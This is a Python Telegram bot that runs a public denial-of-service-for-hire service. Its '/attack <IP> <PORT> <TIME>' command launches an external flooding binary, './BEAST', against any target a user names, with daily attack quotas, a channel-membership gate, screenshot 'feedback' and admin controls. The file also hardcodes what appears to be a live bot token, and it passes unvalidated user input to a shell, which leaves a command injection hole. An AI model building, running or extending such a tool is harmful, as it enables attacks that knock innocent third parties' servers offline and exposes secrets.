#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import aiohttp
import threading
import random
# Insert your Telegram bot token here
bot = telebot.TeleBot('7842005312:AAHMjyrtOAhKKYQjrhaV91sklZoVaCxV8Q0')


# Admin user IDs
admin_id = ["1419969308"]

# Group and channel details
GROUP_ID = "-1002521447777"
CHANNEL_USERNAME = "@operabit"

# Default cooldown and attack limits
COOLDOWN_TIME = 0  # Cooldown in seconds
ATTACK_LIMIT = 20  # Max attacks per day
global_pending_attack = None
global_last_attack_time = None
pending_feedback = {}  # यूजर 

# Files to store user data
USER_FILE = "users.txt"

# Dictionary to store user states
user_data = {}
global_last_attack_time = None  # Global cooldown tracker

# 🎯 Random Image URLs  
image_urls = [
    "https://envs.sh/g7a.jpg",
    "https://envs.sh/g7O.jpg",
    "https://envs.sh/g7_.jpg",
    "https://envs.sh/gHR.jpg",
    "https://envs.sh/gH4.jpg",
    "https://envs.sh/gHU.jpg",
    "https://envs.sh/gHl.jpg",
    "https://envs.sh/gH1.jpg",
    "https://envs.sh/gHk.jpg",
    "https://envs.sh/68x.jpg",
    "https://envs.sh/67E.jpg",
    "https://envs.sh/67Q.jpg",
    "https://envs.sh/686.jpg",
    "https://envs.sh/68V.jpg",
    "https://envs.sh/68-.jpg",
    "https://envs.sh/Vwn.jpg",
    "https://envs.sh/Vwe.jpg",
    "https://envs.sh/VwZ.jpg",
    "https://envs.sh/VwG.jpg",
    "https://envs.sh/VwK.jpg",
    "https://envs.sh/VwA.jpg",
    "https://envs.sh/Vw_.jpg",
    "https://envs.sh/Vwc.jpg"
]

def is_user_in_channel(user_id):
    return True  # **यहीं पर Telegram API से चेक कर सकते हो**
# Function to load user data from the file
def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None
                }
    except FileNotFoundError:
        pass

# Function to save user data to the file
def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

# Middleware to ensure users are joined to the channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global global_last_attack_time

    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, f"🚫 𝙔𝙀 𝘽𝙊𝙏 𝙎𝙄𝙍𝙁 𝙂𝙍𝙊𝙐𝙋 𝙈𝙀 𝘾𝙃𝘼𝙇𝙀𝙂𝘼 𝐘𝐄 ❌\n🔗 𝙅𝙊𝙄𝙉 𝙉𝙀𝙒: {CHANNEL_USERNAME} \n @feedbackschannels")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **𝙋𝙃𝘼𝙇𝙀 𝙅𝙊𝙄𝙉 𝙆𝙍𝙊** {CHANNEL_USERNAME} \n @feedbackschannels🔥")
        return

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "😡 𝙎𝘾𝙍𝙀𝙀𝙉𝙎𝙃𝙊𝙏 𝘿𝙊 𝙋𝙃𝘼𝙇𝙀 🔥\n🚀 𝙉𝙀𝙓𝙏 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝘼𝙂𝘼𝙉𝙀 𝙆𝙀 𝙇𝙄𝙔𝙀 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝘽𝙃𝙀𝙅𝙊 𝙋𝙃𝘼𝙇𝙀")
        return

    # Check if an attack is already running
    if is_attack_running(user_id):
        bot.reply_to(message, "⚠️ 𝙒𝘼𝙄𝙏 𝘽𝙍𝙊 𝘼𝙏𝙏𝘼𝘾𝙆 𝘾𝙃𝘼𝙇 𝘼𝙏𝙏𝘼𝘾𝙆 𝘾𝙃𝘼𝙇 𝙍𝙃𝘼 𝙃𝘼𝙄 ⚡")
        return

    if user_id not in user_data:
        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None}

    user = user_data[user_id]
    if user['attacks'] >= ATTACK_LIMIT:
        bot.reply_to(message, f"❌ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝙄𝙈𝙄𝙏 𝙊𝙑𝙀𝙍 ❌\n🔄 𝙏𝙍𝙔 𝘼𝙂𝘼𝙄𝙉 𝙏𝙊𝙈𝙊𝙍𝙍𝙊𝙒")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ 𝙐𝙨𝙖𝙜𝙚 : /attack <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ 𝙀𝙍𝙍𝙊𝙍 : 𝙋𝙊𝙍𝙏 𝘼𝙉𝘿 𝙏𝙄𝙈𝙀 𝙈𝙐𝙎𝙏 𝘽𝙀 𝙄𝙉𝙏𝙀𝙂𝙀𝙍𝙎")
        return

    if time_duration > 240:
        bot.reply_to(message, "🚫 𝙈𝘼𝙓 𝘿𝙐𝙍𝘼𝙏𝙄𝙊𝙉 = 240𝙨𝙚𝙘")
        return

    # Get the user's profile picture
    profile_photos = bot.get_user_profile_photos(user_id)
    if profile_photos.total_count > 0:
        profile_pic = profile_photos.photos[0][-1].file_id
    else:
        # Ask the user to set a profile picture
        bot.reply_to(message, "❌ 𝘽𝙍𝙊 𝙋𝙍𝙊𝙁𝙄𝙇𝙀 𝙋𝙄𝘾𝙏𝙐𝙍𝙀 𝙇𝘼𝙂𝘼𝙊 𝙋𝙃𝘼𝙇𝙀 🔥\n📸 𝙋𝙇𝙀𝘼𝙎𝙀 𝙎𝙀𝙏 𝘼 𝙋𝙍𝙊𝙁𝙄𝙇𝙀 𝙋𝙄𝘾𝙏𝙐𝙍𝙀 𝙏𝙊 𝘼𝙏𝙏𝘼𝘾𝙆")
        return

    remaining_attacks = ATTACK_LIMIT - user['attacks'] - 1
    random_image = random.choice(image_urls)

    # Send profile picture and attack start message together
    bot.send_photo(message.chat.id, profile_pic, caption=f"👤 User : @{user_name} 🚀\n"
                                                        f"💥 • 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏𝙀𝘿 💥\n"
                                                        f"🎯 • 𝙏𝘼𝙍𝙂𝙀𝙏 : {target} : {port}\n"
                                                        f"⏳ • 𝘿𝙐𝙍𝘼𝙏𝙄𝙊𝙉 : {time_duration}𝙨\n"
                                                        f"⚡ • 𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 : {remaining_attacks}\n"
                                                        f"📸 𝙂𝘼𝙈𝙀 𝙎𝘾𝙍𝙀𝙀𝙉𝙎𝙃𝙊𝙏 𝘽𝙃𝙀𝙅𝙊 𝙋𝙃𝘼𝙇𝙀 \n"
                                                        f"⏳ 𝙋𝙍𝙊𝙂𝙍𝙀𝙎𝙎: 0% ")

    pending_feedback[user_id] = True  

    full_command = f"./BEAST {target} {port} {time_duration} "

    try:
        subprocess.run(full_command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ 𝙀𝙍𝙍𝙊𝙍 : {e}")
        pending_feedback[user_id] = False
        return

    # Update progress bar to 100% and close pop-up
    bot.send_message(message.chat.id, 
                     f"✅ • 𝘼𝙏𝙏𝘼𝘾𝙆 𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀𝘿 ✅\n"
                     f"🎯  {target}:{port} • 𝘿𝙀𝙎𝙏𝙍𝙊𝙔𝙀𝘿\n"
                     f"⏳ • 𝘿𝙐𝙍𝘼𝙏𝙄𝙊𝙉 : {time_duration}𝙨\n"
                     f"⚡ • 𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 : {remaining_attacks}\n"
                     f"⏳ • 𝙋𝙍𝙊𝙂𝙍𝙀𝙎𝙎: 100%")

    threading.Thread(target=send_attack_finished, args=(message, user_name, target, port, time_duration, remaining_attacks)).start()


def is_attack_running(user_id):
    """
    Checks if the user is currently running an attack.
    """
    return user_id in pending_feedback and pending_feedback[user_id] == True


def send_attack_finished(message, user_name, target, port, time_duration, remaining_attacks):
    bot.send_message(message.chat.id, 
                     f"🚀 • 𝙉𝙀𝙓𝙏 𝘼𝙏𝙏𝘼𝘾𝙆 𝙍𝙀𝘼𝘿𝙔 ⚡")
    
@bot.message_handler(commands=['check_cooldown'])
def check_cooldown(message):
    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
        bot.reply_to(message, f"Global cooldown: {remaining_time} seconds remaining.")
    else:
        bot.reply_to(message, "No global cooldown. You can initiate an attack.")

# Command to check remaining attacks for a user
@bot.message_handler(commands=['check_remaining_attack'])
def check_remaining_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in user_data:
        bot.reply_to(message, f"You have {ATTACK_LIMIT} attacks remaining for today.")
    else:
        remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
        bot.reply_to(message, f"You have {remaining_attacks} attacks remaining for today.")

# Admin commands
@bot.message_handler(commands=['reset'])
def reset_user(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "𝙐𝙎𝘼𝙂𝙀: /reset <user_id>")
        return

    user_id = command[1]
    if user_id in user_data:
        user_data[user_id]['attacks'] = 0
        save_users()
        bot.reply_to(message, f"Attack limit for user {user_id} has been reset.")
    else:
        bot.reply_to(message, f"No data found for user {user_id}.")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "𝙐𝙎𝘼𝙂𝙀: /setcooldown <seconds>")
        return

    global COOLDOWN_TIME
    try:
        COOLDOWN_TIME = int(command[1])
        bot.reply_to(message, f"Cooldown time has been set to {COOLDOWN_TIME} seconds.")
    except ValueError:
        bot.reply_to(message, "Please provide a valid number of seconds.")

@bot.message_handler(commands=['viewusers'])
def view_users(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    user_list = "\n".join([f"User ID: {user_id}, Attacks Used: {data['attacks']}, Remaining: {ATTACK_LIMIT - data['attacks']}" 
                           for user_id, data in user_data.items()])
    bot.reply_to(message, f"User Summary:\n\n{user_list}")
    

# Dictionary to store feedback counts per user
feedback_count_dict = {}

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    feedback_count = feedback_count_dict.get(user_id, 0) + 1  # Increment feedback count for the user

    # Update feedback count in the dictionary
    feedback_count_dict[user_id] = feedback_count

    # 🚀 Check if user is in channel  
    try:
        user_status = bot.get_chat_member(CHANNEL_USERNAME, user_id).status
        if user_status not in ['member', 'administrator', 'creator']:
            bot.reply_to(message, f"❌ 𝙔𝙊𝙐 𝙈𝙐𝙎𝙏 𝙅𝙊𝙄𝙉 𝙊𝙐𝙍 𝘾𝙃𝘼𝙉𝙉𝙀𝙇𝙎 𝙁𝙄𝙍𝙎𝙏\n"
                                  f"🔗 𝙅𝙤𝙞𝙣 𝙃𝙚𝙧𝙚 : [Click Here](https://t.me/{CHANNEL_USERNAME} \n@feedbackschannels)")
            return  
    except Exception as e:
        bot.reply_to(message, "❌ 𝘾𝙤𝙪𝙡𝙙'𝙩 𝙑𝙚𝙧𝙞𝙛𝙮! 𝙈𝙖𝙠𝙚 𝙎𝙪𝙧𝙚 𝙏𝙝𝙚 𝘽𝙤𝙩 𝙄𝙨 𝘼𝙙𝙢𝙞𝙣 𝙄𝙣 𝘾𝙝𝙖𝙣𝙣𝙚𝙡.")
        return  

    # ✅ Proceed If User is in Channel
    if pending_feedback.get(user_id, False):
        pending_feedback[user_id] = False  

        # 🚀 Forward Screenshot to Channel  
        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)

        # 🔥 Send Confirmation with SS Number  
        bot.send_message(CHANNEL_USERNAME, 
                         f"📸 • 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙍𝙀𝘾𝙀𝙄𝙑𝙀𝘿\n"
                         f"👤 • 𝙐𝙎𝙀𝙍 : {user_name}\n"
                         f"🆔 • 𝙄𝘿 : {user_id}\n"
                         f"🔢 • 𝙎𝘾𝙍𝙀𝙀𝙉𝙎𝙃𝙊𝙏 𝙉𝙤. : {feedback_count}")

        bot.reply_to(message, "✅ 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝘼𝙘𝙘𝙚𝙥𝙩𝙚𝙙! 𝙉𝙚𝙭𝙩 𝘼𝙩𝙩𝙖𝙘𝙠 𝙍𝙚𝙖𝙙𝙮🚀")
    else:
        bot.reply_to(message, "❌ 𝙏𝙝𝙞𝙨 𝙄𝙨 𝘼 𝙑𝙖𝙡𝙞𝙙 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚")
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""🌟🔥 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝘽𝙍𝙊 {user_name} 🔥🌟
    
🚀 ‼️ 𝗥𝗮𝗛𝗨𝗟 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗜𝗖 𝗕𝗢𝗧 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗  ‼️
     ✔️𝙊𝙒𝙉𝙀𝙍 : @RAHUL_RESPECT
💥 𝙏𝙝𝙚 𝙒𝙤𝙧𝙡𝙙'𝙨 𝘽𝙚𝙨𝙩 𝘿𝙄𝙇𝘿𝙊𝙎 𝘽𝙊𝙏🔥  

🔗 𝙏𝙤 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘽𝙤𝙩, 𝙅𝙤𝙞𝙣 𝙉𝙤𝙬 :  
👉 ✅ @feedbackschannels\n
 ✅ @operabit 🔥"""
    
    bot.reply_to(message, response, parse_mode="Markdown")
# Function to reset daily limits automatically
def auto_reset():
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        for user_id in user_data:
            user_data[user_id]['attacks'] = 0
            user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()

# Start auto-reset in a separate thread
reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()

# Load user data on startup
load_users()


#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        # Add a small delay to avoid rapid looping in case of persistent errors
        time.sleep(15)
        
